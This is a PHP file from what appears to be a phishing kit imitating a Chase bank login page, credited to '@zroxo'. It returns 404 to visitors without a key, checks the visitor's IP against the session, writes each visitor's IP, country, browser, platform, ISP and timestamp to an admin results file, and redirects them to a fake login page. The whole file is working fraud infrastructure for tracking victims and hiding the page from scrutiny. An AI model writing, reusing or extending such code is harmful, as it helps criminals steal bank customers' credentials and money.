<?php
error_reporting(E_ALL ^ E_NOTICE);
session_start();

include'includes/info.php'; 
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
    

if (!isset($_GET['key'])) {
	exit(header("HTTP/1.0 404 Not Found"));
}
$ipcheck = $_GET['ip'];
if ($ipcheck !== $ip or $ipcheck !== $_SESSION['ip']) {
   echo "bad";exit();
}else{
		    $KEYRED = $_GET['key'];
			$_SESSION['ZRXSESSION'] = $KEYRED;
            $content = "".$_SESSION['ip']." |".$_SESSION['countrycode']."| ".$_SESSION['country']." | ".$_SESSION['browser']." | ".$_SESSION['platform']." | ".$_SESSION['isp']." | ".date("h:i:sa")." |".$KEYRED."|ZROXO VISITOR \n";
			$save=fopen("admin/result/visitor.txt","a+");
			fwrite($save,$content);
			fclose($save);
			header("Location: login?key=".$KEYRED."");

}

?>